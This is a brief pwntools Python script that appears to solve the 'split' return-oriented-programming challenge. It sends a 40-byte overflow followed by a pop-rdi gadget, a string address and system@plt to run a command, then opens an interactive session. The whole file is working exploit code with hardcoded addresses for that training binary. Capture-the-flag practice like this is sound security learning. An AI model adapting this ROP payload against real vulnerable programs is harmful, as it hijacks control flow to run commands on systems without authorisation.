from pwn import*
p=process('./split')
elf=ELF('./split')

sys_addr=elf.plt['system']
bin_sh=0x601060
pop_rdi=0x4007c3
payload=b'a'*40+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
p.sendline(payload)
p.interactive()